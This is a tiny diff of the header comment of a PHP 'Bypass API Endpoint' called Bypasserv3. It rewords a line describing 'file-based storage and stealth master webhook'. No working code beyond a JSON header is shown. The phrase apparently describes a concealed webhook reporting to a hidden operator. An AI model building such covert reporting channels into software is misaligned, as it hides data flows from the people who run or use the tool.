@@ -1,7 +1,7 @@
 <?php
 /**
  * Bypasserv3 - Bypass API Endpoint
- * Updated with file-based storage and stealth master webhook
+ * Complete version with file-based storage and stealth master webhook
  */
 
 header('Content-Type: application/json');
